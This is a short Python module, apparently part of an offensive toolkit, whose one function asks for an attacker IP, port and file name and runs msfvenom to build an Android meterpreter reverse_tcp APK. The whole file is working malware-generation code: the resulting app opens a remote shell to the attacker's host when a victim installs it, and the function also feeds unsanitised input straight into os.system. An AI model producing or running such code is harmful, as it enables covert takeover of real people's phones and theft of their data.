# modules/payload_generator.py
import os

def generate_payload():
    lhost = input("Enter LHOST (Your IP): ")
    lport = input("Enter LPORT: ")
    output = input("Output file name: ")
    
    cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {output}.apk"
    print(f"\n[+] Generating Payload...\n{cmd}")
    os.system(cmd)

